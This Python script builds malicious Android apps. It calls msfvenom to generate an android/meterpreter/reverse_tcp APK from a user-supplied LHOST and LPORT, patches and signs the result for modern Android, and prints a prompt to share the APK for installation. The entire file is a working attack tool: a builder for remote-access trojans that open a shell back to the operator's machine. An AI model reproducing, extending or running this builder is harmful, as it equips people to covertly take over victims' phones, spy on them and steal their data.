import os
import subprocess
import shutil
from builder import apk_patch

def find_msfvenom():
    if shutil.which("msfvenom"):
        return "msfvenom"
    else:
        print("msfvenom not found in $PATH.")
        custom = input("Enter full path to msfvenom or leave blank to abort: ").strip()
        if custom and os.path.isfile(custom) and os.access(custom, os.X_OK):
            return custom
        else:
            print("msfvenom not found or not executable. Aborting.")
            return None

def check_output_dir():
    outdir = os.path.join(os.getcwd(), "output")
    if not os.path.isdir(outdir):
        try:
            os.makedirs(outdir)
        except Exception as e:
            print(f"Failed to create output directory: {e}")
            return None
    if not os.access(outdir, os.W_OK):
        print("No write permission to output/ directory.")
        return None
    return outdir

def prompt_overwrite(filepath):
    if os.path.exists(filepath):
        ans = input(f"File {filepath} exists. Overwrite? (y/N): ").strip().lower()
        if ans != "y":
            print("Aborted by user.")
            return False
    return True

def build_payload():
    msfvenom_path = find_msfvenom()
    if not msfvenom_path:
        return

    outdir = check_output_dir()
    if not outdir:
        return

    print("\n--- Build Android Payload ---")
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT (listen port): ").strip()
    payload_type = "android/meterpreter/reverse_tcp"
    print(f"Payload type: {payload_type}")

    default_apk_name = f"payload_{lport}.apk"
    apk_name = input(f"Enter output APK name [{default_apk_name}]: ").strip() or default_apk_name
    out_apk = os.path.join(outdir, apk_name)

    if not prompt_overwrite(out_apk):
        return

    print("\nGenerating payload with msfvenom...\n")
    cmd = [
        msfvenom_path,
        "-p", payload_type,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", out_apk
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)
        print(result.stdout)
        if result.returncode != 0:
            print("Error from msfvenom:\n", result.stderr)
            print("Payload generation failed.")
            return
        print(f"[+] Success! Payload saved to {out_apk}")
        # === PATCH/ALIGN/SIGN FOR MODERN ANDROID ===
        patched_apk = os.path.splitext(out_apk)[0] + "_final.apk"
        print("[*] Patching APK for modern Android requirements...")
        ok = apk_patch.patch_and_sign_apk(
            input_apk=out_apk,
            final_apk=patched_apk
        )
        if ok:
            print(f"[+] Final APK ready for modern Android: {patched_apk}")
            print("Share this APK for installation on Android 7.0+.")
        else:
            print("[!] Patching/signing failed. You may need to fix the input APK or required tools.")
        print("Sign the APK before installing on your device (option 3) if you want to re-sign manually.")
    except Exception as e:
        print(f"Exception running msfvenom: {e}")
